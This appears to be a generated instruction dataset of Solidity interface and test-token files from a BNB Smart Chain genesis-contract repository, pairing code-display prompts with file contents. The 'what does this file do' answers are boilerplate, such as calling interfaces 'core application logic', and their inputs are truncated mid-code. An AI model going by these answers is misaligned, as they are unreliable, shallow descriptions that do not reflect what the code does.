preValidatorSetChangeHeight,\n            bytes32 appHash,\n            bytes32 curValidatorSetHash,\n            bytes memory nextValidatorSet\n        );\n    function rewardForValidatorSetChange() external view returns (uint256);\n    function submitters(uint64) external view returns (address payable);\n    function syncTendermintHeader(bytes memory header, uint64 height) external returns (bool);\n    function updateParam(string memory key, bytes memory value) external;\n}\n\n```"}
{"instruction": "What does the file ITendermintLightClient.sol do?", "input": "```sol\n// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.10;\n\ninterface TendermintLightClient {\n    event initConsensusState(uint64 initHeight, bytes32 appHash);\n    event paramChange(string key, bytes value);\n    event syncConsensusState(uint64 height, uint64 preValidatorSetChangeHeight, bytes32 appHash, bool validatorChanged);\n\n    function BC_FUSION_CHANNELID() external view returns (uint8);\n    function BIND_CHANNELID() external view returns (uint8);\n    function CODE_OK() external view returns (uint32);\n    function CROSS_CHAIN_CONTRACT_ADDR() external view returns (address);\n    function CROSS_STAKE_CHANNELID() external view returns (uint8);\n    function ERROR_FAIL_DECODE() external view returns (uint32);\n    function GOVERNOR_ADDR() external view returns (address);\n    function GOV_CHANNELID() external view returns (uint8);\n    function GOV_HUB_ADDR() external view returns (address);\n    function GOV_TOKEN_ADDR() external view returns (address);\n    function INCENTIVIZE_ADDR() external view returns (address);\n    function INIT_CONSENSUS_STATE_BYTES() external view returns (bytes memory);\n    function INIT_REWARD_FOR_VALIDATOR_SER_CHANGE() external view returns (uint256);\n    function LIGHT_CLIENT_ADDR() external view returns (address);\n    function RELAYERHUB_CONTRACT_ADDR() external view returns (address);\n    function SLASH_CHANNELID() external view returns (uint8);\n    function SLASH_CONTRACT_ADDR() external view returns (address);\n    function STAKE_CREDIT_ADDR() external view returns (address);\n    function STAKE_HUB_ADDR() external view returns (address);\n    function STAKING_CHANNELID() external view returns (uint8);\n    function STAKING_CONTRACT_ADDR() external view returns (address);\n    function SYSTEM_REWARD_ADDR() external view returns (address);\n    function TIMELOCK_ADDR() external view returns (address);\n    function TOKEN_HUB_ADDR() external view returns (address);\n    function TOKEN_MANAGER_ADDR() external view returns (address);\n    funct\n```", "output": "This file `ITendermintLightClient.sol` is part of the interface project. Based on the code structure, it appears to handle core application logic."}
{"instruction": "Show me the code for ITestToken.sol which is part of the interface project.", "input": "", "output": "Here's the code for `projects\\active\\binance\\bsc-genesis-contract\\test\\utils\\interface\\ITestToken.sol`:\n\n```sol\npragma solidity ^0.8.10;\n\ninterface ITestToken {\n    event Approval(address indexed owner, address indexed spender, uint256 value);\n    event Transfer(address indexed from, address indexed to, uint256 value);\n\n    function allowance(address owner, address spender) external view returns (uint256);\n    function approve(address spender, uint256 amount) external returns (bool);\n    function balanceOf(address account) external view returns (uint256);\n    function decimals() external view returns (uint8);\n    function name() external view returns (string memory);\n    function symbol() external view returns (string memory);\n    function totalSupply() external view returns (uint256);\n    function transfer(address recipient, uint256 amount) external returns (bool);\n    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);\n}\n\n```"}
{"instruction": "What does the file ITestToken.sol do?", "input": "```sol\npragma solidity ^0.8.10;\n\ninterface ITestToken {\n    event Approval(address indexed owner, address indexed spender, uint256 value);\n    event Transfer(address indexed from, address indexed to, uint256 value);\n\n    function allowance(address owner, address spender) external view returns (uint256);\n    function approve(address spender, uint256 amount) external returns (bool);\n    function balanceOf(address account) external view returns (uint256);\n    function decimals() external view returns (uint8);\n    function name() external view returns (string memory);\n    function symbol() external view returns (string memory);\n    function totalSupply() external view returns (uint256);\n    function transfer(address recipient, uint256 amount) external returns (bool);\n    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);\n}\n\n```", "output": "This file `ITestToken.sol` is part of the interface project. Based on the code structure, it appears to handle testing and validation."}
{"instruction": "Show me the code for ITokenHub.sol which is part of the interface project.", "input": "", "output": "Here's the code for `projects\\active\\binance\\bsc-genesis-contract\\test\\utils\\interface\\ITokenHub.sol`:\n\n```sol\n// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.10;\n\ninterface TokenHub {\n    event CancelTokenRecoverLock(\n        bytes32 indexed tokenSymbol, address indexed tokenAddr, address indexed attacker, uint256 amount\n    );\n    event CancelTransfer(address indexed tokenAddr, address indexed attacker, uint256 amount);\n    event LargeTransferLimitSet(address indexed tokenAddr, address indexed owner, uint256 largeTransferLimit);\n    event LargeTransferLocked(address indexed tokenAddr, address indexed recipient, uint256 amount, uint256 unlockAt);\n    event NotBoundToken(bytes32 indexed tokenSymbol, address indexed recipient, uint256 amount);\n    event TokenRecoverLocked(\n        bytes32 indexed tokenSymbol,\n        address indexed tokenAddr,\n        address indexed recipient,\n        uint256 amount,\n        uint256 unlockAt\n    );\n    event WithdrawUnlockedToken(address indexed tokenAddr, address indexed recipient, uint256 amount);\n    event paramChange(string key, bytes value);\n    event receiveDeposit(address from, uint256 amount);\n    event refundFailure(address bep20Addr, address refundAddr, uint256 amount, uint32 status);\n    event refundSuccess(address bep20Addr, address refundAddr, uint256 amount, uint32 status);\n    event rewardTo(address to, uint256 amount);\n    event transferInSuccess(address bep20Addr, address refundAddr, uint256 amount);\n    event transferOutSuccess(address bep20Addr, address senderAddr, uint256 amount, uint256 relayFee);\n    event unexpectedPackage(uint8 channelId, bytes msgBytes);\n\n    receive() external payable;\n\n    function BC_FUSION_CHANNELID() external view returns (uint8);\n    function BEP2_TOKEN_DECIMALS() external view returns (uint8);\n    function BEP2_TOKEN_SYMBOL_FOR_BNB() external view returns (bytes32);\n    function BIND_CHANNELID() external view returns (uint8);\n    function CODE_OK() external view returns (uint32);\n    function CROSS_CHAIN_CONTRACT_ADDR() external view returns (address);\n    function CROSS_STAKE_CHANNELID() external view returns (uint8);\n    function ERROR_FAIL_DECODE() external view returns (uint32);\n    function GOVERNOR_ADDR() external view returns (address);\n    function GOV_CHANNELID() external view returns (uint8);\n    function GOV_HUB_ADDR() external view returns (address);\n    function GOV_TOKEN_ADDR() external view returns (address);\n    function INCENTIVIZE_ADDR() external view returns (address);\n    function INIT_BNB_LARGE_TRANSFER_LIMIT() external view returns (uint256);\n    function INIT_LOCK_PERIOD() external view returns (uint256);\n    function INIT_MINIMUM_RELAY_FEE() external view returns (uint256);\n    function LIGHT_CLIENT_ADDR() external view returns (address);\n    function LOCK_PERIOD_FOR_TOKEN_RECOVER() external view returns (uint256);\n    function MAXIMUM_BEP20_SYMBOL_LEN() external view returns (uint8);\n    function MAX_BEP2_TOTAL_SUPPLY() external view returns (uint256);\n    function MAX_GAS_FOR_CALLING_BEP20() external view returns (uint256);\n    function MAX_GAS_FOR_TRANSFER_BNB() external view returns (uint256);\n    function MINIMUM_BEP20_SYMBOL_LEN() external view returns (uint8);\n    function RELAYERHUB_CONTRACT_ADDR() external view returns (address);\n    function REWARD_UPPER_LIMIT() external view returns (uint256);\n    function SLASH_CHANNELID() external view returns (uint8);\n    function SLASH_CONTRACT_ADDR() external view returns (address);\n    function STAKE_CREDIT_ADDR() external view returns (address);\n    function STAKE_HUB_ADDR() external view returns (address);\n    function STAKING_CHANNELID() external view returns (uint8);\n    function STAKING_CONTRACT_ADDR() external view returns (address);\n    function SYSTEM_REWARD_ADDR() external view returns (address);\n    function TEN_DECIMALS() external view returns (uint256);\n    function TIMELOCK_ADDR() external view returns (address);\n    function TOKEN_HUB_ADDR() external view returns (address);\n    function TOKEN_MANAGER_ADDR() external view returns (address);\n    function TOKEN_RECOVER_PORTAL_ADDR() external view returns (address);\n    function TRANSFER_IN_CHANNELID() external view returns (uint8);\n    function TRANSFER_IN_FAILURE_INSUFFICIENT_BALANCE() external view returns (uint8);\n    function TRANSFER_IN_FAILURE_NON_PAYABLE_RECIPIENT() external view returns (uint8);\n    function TRANSFER_IN_FAILURE_TIMEOUT() external view returns (uint8);\n    function TRANSFER_IN_FAILURE_UNBOUND_TOKEN() external view returns (uint8);\n    function TRANSFER_IN_FAILURE_UNKNOWN() external view returns (uint8);\n    function TRANSFER_IN_SUCCESS() external view returns (uint8);\n    function TRANSFER_OUT_CHANNELID() external view returns (uint8);\n    function VALIDATOR_CONTRACT_ADDR() external view returns (address);\n    function alreadyInit() external view returns (bool);\n    function batchTransferOutBNB(\n        address[] memory recipientAddrs,\n        uint256[] memory amounts,\n        address[] memory refundAddrs,\n        uint64 expireTime\n    ) external payable returns (bool);\n    function bep20ContractDecimals(address) external view returns (uint256);\n    function bindToken(bytes32 bep2Symbol, address contractAddr, uint256 decimals) external;\n    function bscChainID() external view returns (uint16);\n    function cancelTokenRecoverLock(bytes32 tokenSymbol, address attacker) external;\n    function cancelTransferIn(address tokenAddress, address attacker) external;\n    function claimMigrationFund(uint256 amount) external returns (bool);\n    function claimRewards(address payable to, uint256 amount) external returns (uint256);\n    function getBep2SymbolByContractAddr(address contractAddr) external view returns (bytes32);\n    function getBoundBep2Symbol(address contractAddr) external view returns (string memory);\n    function getBoundContract(string memory bep2Symbol) external view returns (address);\n    function getContractAddrByBEP2Symbol(bytes32 bep2Symbol) external view returns (address);\n    function getMiniRelayFee() external view returns (uint256);\n    function handleAckPackage(uint8 channelId, bytes memory msgBytes) external;\n    function handleFailAckPackage(uint8 channelId, bytes memory msgBytes) external;\n    function handleSynPackage(uint8 channelId, bytes memory msgBytes) external returns (bytes memory);\n    function init() external;\n    function largeTransferLimitMap(address) external view returns (uint256);\n    function lockInfoMap(address, address) external view returns (uint256 amount, uint256 unlockAt);\n    function lockPeriod() external view returns (uint256);\n    function recoverBCAsset(bytes32 tokenSymbol, address recipient, uint256 amount) external;\n    function relayFee() external view returns (uint256);\n    function setLargeTransferLimit(address bep20Token, uint256 largeTransferLimit) external;\n    function transferOut(\n        address contractAddr,\n        address recipient,\n        uint256 amount,\n        uint64 expireTime\n    ) external payable returns (bool);\n    function unbindToken(bytes32 bep2Symbol, address contractAddr) external;\n    function updateParam(string memory key, bytes memory value) external;\n    function withdrawStakingBNB(uint256 amount) external returns (bool);\n    function withdrawUnlockedToken(address tokenAddress, address recipient) external;\n}\n\n```"}
{"instruction": "What does the file ITokenHub.sol do?", "input": "```sol\n// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.10;\n\ninterface TokenHub {\n    event CancelTokenRecoverLock(\n        bytes32 indexed tokenSymbol, address indexed tokenAddr, address indexed attacker, uint256 amount\n    );\n    event CancelTransfer(address indexed tokenAddr, address indexed attacker, uint256 amount);\n    event LargeTransferLimitSet(address indexed tokenAddr, address indexed owner, uint256 largeTransferLimit);\n    event LargeTransferLocked(address indexed tokenAddr, address indexed recipient, uint256 amount, uint256 unlockAt);\n    event NotBoundToken(bytes32 indexed tokenSymbol, address indexed recipient, uint256 amount);\n    event TokenRecoverLocked(\n        bytes32 indexed tokenSymbol,\n        address indexed tokenAddr,\n        address indexed recipient,\n        uint256 amount,\n        uint256 unlockAt\n    );\n    event WithdrawUnlockedToken(address indexed tokenAddr, address indexed recipient, uint256 amount);\n    event paramChange(string key, bytes value);\n    event receiveDeposit(address from, uint256 amount);\n    event refundFailure(address bep20Addr, address refundAddr, uint256 amount, uint32 status);\n    event refundSuccess(address bep20Addr, address refundAddr, uint256 amount, uint32 status);\n    event rewardTo(address to, uint256 amount);\n    event transferInSuccess(address bep20Addr, address refundAddr, uint256 amount);\n    event transferOutSuccess(address bep20Addr, address senderAddr, uint256 amount, uint256 relayFee);\n    event unexpectedPackage(uint8 channelId, bytes msgBytes);\n\n    receive() external payable;\n\n    function BC_FUSION_CHANNELID() external view returns (uint8);\n    function BEP2_TOKEN_DECIMALS() external view returns (uint8);\n    function BEP2_TOKEN_SYMBOL_FOR_BNB() external view returns (bytes32);\n    function BIND_CHANNELID() external view returns (uint8);\n    function CODE_OK() external view returns (uint32);\n    function CROSS_CHAIN_CONTRACT_ADDR() external view returns (address);\n    function CROSS_STAKE_CHAN\n```", "output": "This file `ITokenHub.sol` is part of the interface project. Based on the code structure, it appears to handle core application logic."}
{"instruction": "Show me the code for ITokenManager.sol which is part of the interface project.", "input": "", "output": "Here's the code for `projects\\active\\binance\\bsc-genesis-contract\\test\\utils\\interface\\ITokenManager.sol`:\n\n```sol\n// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.10;\n\ninterface TokenManager {\n    event bindFailure(address indexed contractAddr, string bep2Symbol, uint32 failedReason);\n    event bindSuccess(address indexed contractAddr, string bep2Symbol, uint256 totalSupply, uint256 peggyAmount);\n    event mirrorFailure(address indexed bep20Addr, uint8 errCode);\n    event mirrorSuccess(address indexed bep20Addr, bytes32 bep2Symbol);\n    event paramChange(string key, bytes value);\n    event syncFailure(address indexed bep20Addr, uint8 errCode);\n    event syncSuccess(address indexed bep20Addr);\n    event unexpectedPackage(uint8 channelId, bytes msgBytes);\n\n    function BC_FUSION_CHANNELID() external view returns (uint8);\n    function BEP2_TOKEN_DECIMALS() external view returns (uint8);\n    function BIND_CHANNELID() external view returns (uint8);\n    function BIND_PACKAGE() external view returns (uint8);\n    function BIND_STATUS_ALREADY_BOUND_TOKEN() external view returns (uint8);\n    function BIND_STATUS_DECIMALS_MISMATCH() external view returns (uint8);\n    function BIND_STATUS_REJECTED() external view returns (uint8);\n    function BIND_STATUS_SYMBOL_MISMATCH() external view returns (uint8);\n    function BIND_STATUS_TIMEOUT() external view returns (uint8);\n    function BIND_STATUS_TOO_MUCH_TOKENHUB_BALANCE() external view returns (uint8);\n    function BIND_STATUS_TOTAL_SUPPLY_MISMATCH() external view returns (uint8);\n    function CODE_OK() external view returns (uint32);\n    function CROSS_CHAIN_CONTRACT_ADDR() external view returns (address);\n    function CROSS_STAKE_CHANNELID() external view returns (uint8);\n    function ERROR_FAIL_DECODE() external view returns (uint32);\n    function GOVERNOR_ADDR() external view returns (address);\n    function GOV_CHANNELID() external view returns (uint8);\n    function GOV_HUB_ADDR() external view returns (address);\n    function GOV_TOKEN_ADDR() external view returns (address);\n    function INCENTIVIZE_ADDR() external view returns (address);\n    function LIGHT_CLIENT_ADDR() external view returns (address);\n    function LOG_MAX_UINT256() external view returns (uint256);\n    function MAXIMUM_BEP20_SYMBOL_LEN() external view returns (uint8);\n    function MAX_BEP2_TOTAL_SUPPLY() external view returns (uint256);\n    function MAX_GAS_FOR_TRANSFER_BNB() external view returns (uint256);\n    function MINIMUM_BEP20_SYMBOL_LEN() external view returns (uint8);\n    function MIRROR_CHANNELID() external view returns (uint8);\n    function MIRROR_STATUS_ALREADY_BOUND() external view returns (uint8);\n    function MIRROR_STATUS_DUPLICATED_BEP2_SYMBOL() external view returns (uint8);\n    function MIRROR_STATUS_TIMEOUT() external view returns (uint8);\n    function RELAYERHUB_CONTRACT_ADDR() external view returns (address);\n    function SLASH_CHANNELID() external view returns (uint8);\n    function SLASH_CONTRACT_ADDR() external view returns (address);\n    function STAKE_CREDIT_ADDR() external view returns (address);\n    function STAKE_HUB_ADDR() external view returns (address);\n    function STAKING_CHANNELID() external view returns (uint8);\n    function STAKING_CONTRACT_ADDR() external view returns (address);\n    function SYNC_CHANNELID() external view returns (uint8);\n    function SYNC_STATUS_NOT_BOUND_MIRROR() external view returns (uint8);\n    function SYNC_STATUS_TIMEOUT() external view returns (uint8);\n    function SYSTEM_REWARD_ADDR() external view returns (address);\n    function TEN_DECIMALS() external view returns (uint256);\n    function TIMELOCK_ADDR() external view returns (address);\n    function TOKEN_HUB_ADDR() external view returns (address);\n    function TOKEN_MANAGER_ADDR() external view returns (address);\n    function TOKEN_RECOVER_PORTAL_ADDR() external view returns (address);\n    function TRANSFER_IN_CHANNELID() external view returns (uint8);\n    function TRANSFER_OUT_CHANNELID() external view returns (uint8);\n    function UNBIND_PACKAGE() external view returns (uint8);\n    function VALIDATOR_CONTRACT_ADDR() external view returns (address);\n    function alreadyInit() external view returns (bool);\n    function approveBind(address contractAddr, string memory bep2Symbol) external payable returns (bool);\n    function bindPackageRecord(bytes32)\n        external\n        view\n        returns (\n            uint8 packageType,\n            bytes32 bep2TokenSymbol,\n            address contractAddr,\n            uint256 totalSupply,\n            uint256 peggyAmount,\n            uint8 bep20Decimals,\n            uint64 expireTime\n        );\n    function boundByMirror(address) external view returns (bool);\n    function bscChainID() external view returns (uint16);\n    function expireBind(string memory bep2Symbol) external payable returns (bool);\n    function handleAckPackage(uint8 channelId, bytes memory msgBytes) external;\n    function handleFailAckPackage(uint8 channelId, bytes memory msgBytes) external;\n    function handleSynPackage(uint8 channelId, bytes memory msgBytes) external returns (bytes memory);\n    function mirror(address bep20Addr, uint64 expireTime) external payable returns (bool);\n    function mirrorFee() external view returns (uint256);\n    function mirrorPendingRecord(address) external view returns (bool);\n    function queryRequiredLockAmountForBind(string memory symbol) external view returns (uint256);\n    function rejectBind(address contractAddr, string memory bep2Symbol) external payable returns (bool);\n    function sync(address bep20Addr, uint64 expireTime) external payable returns (bool);\n    function syncFee() external view returns (uint256);\n    function updateParam(string memory key, bytes memory value) external;\n}\n\n```"}
{"instruction": "What does the file ITokenManager.sol do?", "input": "```sol\n// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.10;\n\ninterface TokenManager {\n    event bindFailure(address indexed contractAddr, string bep2Symbol, uint32 failedReason);\n    event bindSuccess(address indexed contractAddr, string bep2Symbol, uint256 totalSupply, uint256 peggyAmount);\n    event mirrorFailure(address indexed bep20Addr, uint8 errCode);\n    event mirrorSuccess(address indexed bep20Addr, bytes32 bep2Symbol);\n    event paramChange(string key, bytes value);\n    event syncFailure(address indexed bep20Addr, uint8 errCode);\n    event syncSuccess(address indexed bep20Addr);\n    event unexpectedPackage(uint8 channelId, bytes msgBytes);\n\n    function BC_FUSION_CHANNELID() external view returns (uint8);\n    function BEP2_TOKEN_DECIMALS() external view returns (uint8);\n    function BIND_CHANNELID() external view returns (uint8);\n    function BIND_PACKAGE() external view returns (uint8);\n    function BIND_STATUS_ALREADY_BOUND_TOKEN() external view returns (uint8);\n    function BIND_STATUS_DECIMALS_MISMATCH() external view returns (uint8);\n    function BIND_STATUS_REJECTED() external view returns (uint8);\n    function BIND_STATUS_SYMBOL_MISMATCH() external view returns (uint8);\n    function BIND_STATUS_TIMEOUT() external view returns (uint8);\n    function BIND_STATUS_TOO_MUCH_TOKENHUB_BALANCE() external view returns (uint8);\n    function BIND_STATUS_TOTAL_SUPPLY_MISMATCH() external view returns (uint8);\n    function CODE_OK() external view returns (uint32);\n    function CROSS_CHAIN_CONTRACT_ADDR() external view returns (address);\n    function CROSS_STAKE_CHANNELID() external view returns (uint8);\n    function ERROR_FAIL_DECODE() external view returns (uint32);\n    function GOVERNOR_ADDR() external view returns (address);\n    function GOV_CHANNELID() external view returns (uint8);\n    function GOV_HUB_ADDR() external view returns (address);\n    function GOV_TOKEN_ADDR() external view returns (address);\n    function INCENTIVIZE_ADDR() external view returns\n```", "output": "This file `ITokenManager.sol` is part of the interface project. Based on the code structure, it appears to handle core application logic."}
{"instruction": "Show me the code for ITokenRecoverPortal.sol which is part of the interface project.", "input": "", "output": "Here's the code for `projects\\active\\binance\\bsc-genesis-contract\\test\\utils\\interface\\ITokenRecoverPortal.sol`:\n\n```sol\n// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.10;\n\ninterface TokenRecoverPortal {\n    error AlreadyPaused();\n    error AlreadyRecovered();\n    error ApprovalAddressNotInitialized();\n    error InBlackList();\n    error InvalidApprovalSignature();\n    error InvalidOwnerPubKeyLength();\n    error InvalidOwnerSignatureLength();\n    error InvalidProof();\n    error InvalidValue(string key, bytes value);\n    error MerkleRootAlreadyInitiated();\n    error MerkleRootNotInitialized();\n    error NotPaused();\n    error OnlyCoinbase();\n    error OnlyProtector();\n    error OnlySystemContract(address systemContract);\n    error OnlyZeroGasPrice();\n    error TokenRecoverPortalPaused();\n    error UnknownParam(string key, bytes value);\n\n    event BlackListed(address indexed target);\n    event Initialized(uint8 version);\n    event ParamChange(string key, bytes value);\n    event Paused();\n    event ProtectorChanged(address indexed oldProtector, address indexed newProtector);\n    event Resumed();\n    event TokenRecoverRequested(bytes ownerAddress, bytes32 tokenSymbol, address account, uint256 amount);\n    event UnBlackListed(address indexed target);\n\n    function BC_FUSION_CHANNELID() external view returns (uint8);\n    function SOURCE_CHAIN_ID() external view returns (string memory);\n    function STAKING_CHANNELID() external view returns (uint8);\n    function addToBlackList(address account) external;\n    function approvalAddress() external view returns (address);\n    function blackList(address) external view returns (bool);\n    function cancelTokenRecover(bytes32 tokenSymbol, address attacker) external;\n    function initialize() external;\n    function isPaused() external view returns (bool);\n    function isRecovered(bytes32 node) external view returns (bool);\n    function merkleRoot() external view returns (bytes32);\n    function merkleRootAlreadyInit() external view returns (bool);\n    function pause() external;\n    function recover(\n        bytes32 tokenSymbol,\n        uint256 amount,\n        bytes memory ownerPubKey,\n        bytes memory ownerSignature,\n        bytes memory approvalSignature,\n        bytes32[] memory merkleProof\n    ) external;\n    function removeFromBlackList(address account) external;\n    function resume() external;\n    function updateParam(string memory key, bytes memory value) external;\n}\n\n```"}
{"instruction": "What does the file ITokenRecoverPortal.sol do?", "input": "```sol\n// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.10;\n\ninterface TokenRecoverPortal {\n    error AlreadyPaused();\n    error AlreadyRecovered();\n    error ApprovalAddressNotInitialized();\n    error InBlackList();\n    error InvalidApprovalSignature();\n    error InvalidOwnerPubKeyLength();\n    error InvalidOwnerSignatureLength();\n    error InvalidProof();\n    error InvalidValue(string key, bytes value);\n    error MerkleRootAlreadyInitiated();\n    error MerkleRootNotInitialized();\n    error NotPaused();\n    error OnlyCoinbase();\n    error OnlyProtector();\n    error OnlySystemContract(address systemContract);\n    error OnlyZeroGasPrice();\n    error TokenRecoverPortalPaused();\n    error UnknownParam(string key, bytes value);\n\n    event BlackListed(address indexed target);\n    event Initialized(uint8 version);\n    event ParamChange(string key, bytes value);\n    event Paused();\n    event ProtectorChanged(address indexed oldProtector, address indexed newProtector);\n    event Resumed();\n    event TokenRecoverRequested(bytes ownerAddress, bytes32 tokenSymbol, address account, uint256 amount);\n    event UnBlackListed(address indexed target);\n\n    function BC_FUSION_CHANNELID() external view returns (uint8);\n    function SOURCE_CHAIN_ID() external view returns (string memory);\n    function STAKING_CHANNELID() external view returns (uint8);\n    function addToBlackList(address account) external;\n    function approvalAddress() external view returns (address);\n    function blackList(address) external view returns (bool);\n    function cancelTokenRecover(bytes32 tokenSymbol, address attacker) external;\n    function initialize() external;\n    function isPaused() external view returns (bool);\n    function isRecovered(bytes32 node) external view returns (bool);\n    function merkleRoot() external view returns (bytes32);\n    function merkleRootAlreadyInit() external view returns (bool);\n    function pause() external;\n    function recover(\n        bytes32 tokenSymbol,\n        uint2\n```", "output": "This file `ITokenRecoverPortal.sol` is part of the interface project. Based on the code structure, it appears to handle core application logic."}
{"instruction": "Show me the code for ABCToken.sol which is part of the test_token project.", "input": "", "output": "Here's the code for `projects\\active\\binance\\bsc-genesis-contract\\test\\utils\\test_token\\ABCToken.sol`:\n\n```sol\npragma solidity ^0.8.0;\n\nimport \"@openzeppelin/contracts/utils/Context.sol\";\nimport \"@openzeppelin/contracts/access/Ownable.sol\";\n\nimport \"../interface/ITestToken.sol\";\n\ncontract ABCToken is Context, ITestToken, Ownable {\n    mapping(address => uint256) private _balances;\n\n    mapping(address => mapping(address => uint256)) private _allowances;\n\n    uint256 private _totalSupply;\n    uint8 public _decimals;\n    string public _symbol;\n    string public _name;\n\n    constructor() {\n        _name = \"ABC token\";\n        _symbol = \"ABC\";\n        _decimals = 18;\n        _totalSupply = 100000000000000000000000000;\n        _balances[msg.sender] = _totalSupply;\n\n        emit Transfer(address(0), msg.sender, _totalSupply);\n    }\n\n    /**\n     * @dev Returns the bep token owner.\n     */\n    function getOwner() external view returns (address) {\n        return owner();\n    }\n\n    /**\n     * @dev Returns the token decimals.\n     */\n    function decimals() external view returns (uint8) {\n        return _decimals;\n    }\n\n    /**\n     * @dev Returns the token symbol.\n     */\n    function symbol() external view returns (string memory) {\n        return _symbol;\n    }\n\n    /**\n     * @dev Returns the token name.\n     */\n    function name() external view returns (string memory) {\n        return _name;\n    }\n\n    /**\n     * @dev See {BEP20-totalSupply}.\n     */\n    function totalSupply() external view returns (uint256) {\n        return _totalSupply;\n    }\n\n    /**\n     * @dev See {BEP20-balanceOf}.\n     */\n    function balanceOf(address account) external view returns (uint256) {\n        return _balances[account];\n    }\n\n    /**\n     * @dev See {BEP20-transfer}.\n     *\n     * Requirements:\n     *\n     * - `recipient` cannot be the zero address.\n     * - the caller must have a balance of at least `amount`.\n     */\n    function transfer(address recipient, uint256 amount) external returns (bool) {\n        _transfer(_msgSender(), recipient, amount);\n        return true;\n    }\n\n    /**\n     * @dev See {BEP20-allowance}.\n     */\n    function allowance(address owner, address spender) external view returns (uint256) {\n        return _allowances[owner][spender];\n    }\n\n    /**\n     * @dev See {BEP20-approve}.\n     *\n     * Requirements:\n     *\n     * - `spender` cannot be the zero address.\n     */\n    function approve(address spender, uint256 amount) external returns (bool) {\n        _approve(_msgSender(), spender, amount);\n        return true;\n    }\n\n    /**\n     * @dev See {BEP20-transferFrom}.\n     *\n     * Emits an {Approval} event indicating the updated allowance. This is not\n     * required by the EIP. See the note at the beginning of {BEP20};\n     *\n     * Requirements:\n     * - `sender` and `recipient` cannot be the zero address.\n     * - `sender` must have a balance of at least `amount`.\n     * - the caller must have allowance for `sender`'s tokens of at least\n     * `amount`.\n     */\n    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool) {\n        require(_allowances[sender][_msgSender()] >= amount, \"BEP20: transfer amount exceeds allowance\");\n        _transfer(sender, recipient, amount);\n        _approve(sender, _msgSender(), _allowances[sender][_msgSender()] - amount);\n        return true;\n    }\n\n    /**\n     * @dev Atomically increases the allowance granted to `spender` by the caller.\n     *\n     * This is an alternative to {approve} that can be used as a mitigation for\n     * problems described in {BEP20-approve}.\n     *\n     * Emits an {Approval} event indicating the updated allowance.\n     *\n     * Requirements:\n     *\n     * - `spender` cannot be the zero address.\n     */\n    function increaseAllowance(address spender, uint256 addedValue) public returns (bool) {\n        _approve(_msgSender(), spender, _allowances[_msgSender()][spender] + addedValue);\n        return true;\n    }\n\n    /**\n     * @dev Atomically decreases the allowance granted to `spender` by the caller.\n     *\n     * This is an alternative to {approve} that can be used as a mitigation for\n     * problems described in {BEP20-approve}.\n     *\n     * Emits an {Approval} event indicating the updated allowance.\n     *\n     * Requirements:\n     *\n     * - `spender` cannot be the zero address.\n     * - `spender` must have allowance for the caller of at least\n     * `subtractedValue`.\n     */\n    function decreaseAllowance(address spender, uint256 subtractedValue) public returns (bool) {\n        _approve(_msgSender(), spender, _allowances[_msgSender()][spender] - subtractedValue);\n        return true;\n    }\n\n    /**\n     * @dev Moves tokens `amount` from `sender` to `recipient`.\n     *\n     * This is internal function is equivalent to {transfer}, and can be used to\n     * e.g. implement automatic token fees, slashing mechanisms, etc.\n     *\n     * Emits a {Transfer} event.\n     *\n     * Requirements:\n     *\n     * - `sender` cannot be the zero address.\n     * - `recipient` cannot be the zero address.\n     * - `sender` must have a balance of at least `amount`.\n     */\n    function _transfer(address sender, address recipient, uint256 amount) internal {\n        require(sender != address(0), \"BEP20: transfer from the zero address\");\n        require(recipient != address(0), \"BEP20: transfer to the zero address\");\n\n        _balances[sender] = _balances[sender] - amount;\n        _balances[recipient] = _balances[recipient] + amount;\n        emit Transfer(sender, recipient, amount);\n    }\n\n    /**\n     * @dev Creates `amount` tokens and assigns them to `account`, increasing\n     * the total supply.\n     *\n     * Emits a {Transfer} event with `from` set to the zero address.\n     *\n     * Requirements\n     *\n     * - `to` cannot be the zero address.\n     */\n    function _mint(address account, uint256 amount) internal {\n        require(account != address(0), \"BEP20: mint to the zero address\");\n\n        _totalSupply = _totalSupply + amount;\n        _balances[account] = _balances[account] + amount;\n        emit Transfer(address(0), account, amount);\n    }\n\n    /**\n     * @dev Destroys `amount` tokens from `account`, reducing the\n     * total supply.\n     *\n     * Emits a {Transfer} event with `to` set to the zero address.\n     *\n     * Requirements\n     *\n     * - `account` cannot be the zero address.\n     * - `account` must have at least `amount` tokens.\n     */\n    function _burn(address account, uint256 amount) internal {\n        require(account != address(0), \"BEP20: burn from the zero address\");\n\n        _balances[account] = _balances[account] - amount;\n        _totalSupply = _totalSupply - amount;\n        emit Transfer(account, address(0), amount);\n    }\n\n    /**\n     * @dev Sets `amount` as the allowance of `spender` over the `owner`s tokens.\n     *\n     * This is internal function is equivalent to `approve`, and can be used to\n     * e.g. set automatic allowances for certain subsystems, etc.\n     *\n     * Emits an {Approval} event.\n     *\n     * Requirements:\n     *\n     * - `owner` cannot be the zero address.\n     * - `spender` cannot be the zero address.\n     */\n    function _approve(address owner, address spender, uint256 amount) internal {\n        require(owner != address(0), \"BEP20: approve from the zero address\");\n        require(spender != address(0), \"BEP20: approve to the zero address\");\n\n        _allowances[owner][spender] = amount;\n        emit Approval(owner, spender, amount);\n    }\n\n    /**\n     * @dev Destroys `amount` tokens from `account`.`amount` is then deducted\n     * from the caller's allowance.\n     *\n     * See {_burn} and {_approve}.\n     */\n    function _burnFrom(address account, uint256 amount) internal {\n        _burn(account, amount);\n        _approve(account, _msgSender(), _allowances[account][_msgSender()] - amount);\n    }\n}\n\n```"}
